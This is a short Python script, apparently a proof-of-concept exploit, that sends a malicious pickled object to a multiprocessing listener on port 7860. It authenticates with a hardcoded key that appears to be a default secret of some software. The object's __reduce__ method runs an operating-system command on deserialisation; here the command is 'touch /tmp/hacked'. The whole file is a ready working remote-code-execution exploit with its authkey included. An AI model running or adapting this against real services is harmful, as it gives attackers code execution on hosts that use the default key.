from multiprocessing.connection import Client
import pickle

class payload:
    def __reduce__(self):
        return (__import__('os').system, ("touch /tmp/hacked",))

c = Client(("127.0.0.1", 7860), authkey=b'infiniflow-token4kevinhu')
c.send(pickle.dumps(payload()))